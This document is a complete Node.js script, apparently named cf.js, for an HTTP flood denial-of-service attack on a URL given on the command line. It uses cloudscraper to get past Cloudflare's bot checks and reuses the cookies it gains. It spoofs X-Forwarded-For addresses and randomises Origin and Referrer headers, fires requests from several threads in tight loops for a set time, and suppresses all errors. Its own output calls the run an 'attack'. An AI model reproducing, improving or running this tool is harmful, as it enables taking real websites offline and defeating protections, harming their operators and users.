const cloudscraper = require('cloudscraper');
const request = require('request');
const args = process.argv.slice(2);

process.on('uncaughtException', () => { "Hi" });
process.on('unhandledRejection', () => { "Hi" });

if (process.argv.length <= 2) {
    console.log(`[Usage] node cf.js <url> <time> <threads>`);
    console.log(`[Example] node cf.js example.com 60`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

const url = process.argv[2]
const time = Number(process.argv[3])
const threads = Number(process.argv[4]) || 1;

console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);

for (let i = 0; i < threads; i++) {
    const int = setInterval(() => {
        cloudscraper.get(url, function (e, r, b) {
            if (e) return;
            const cookie = r.request.headers.request.cookie;
            const useragent = r.request.headers['User-Agent'];
            const ip = rIp();
            request({
                url: url,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': ip
                }
            });
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);

}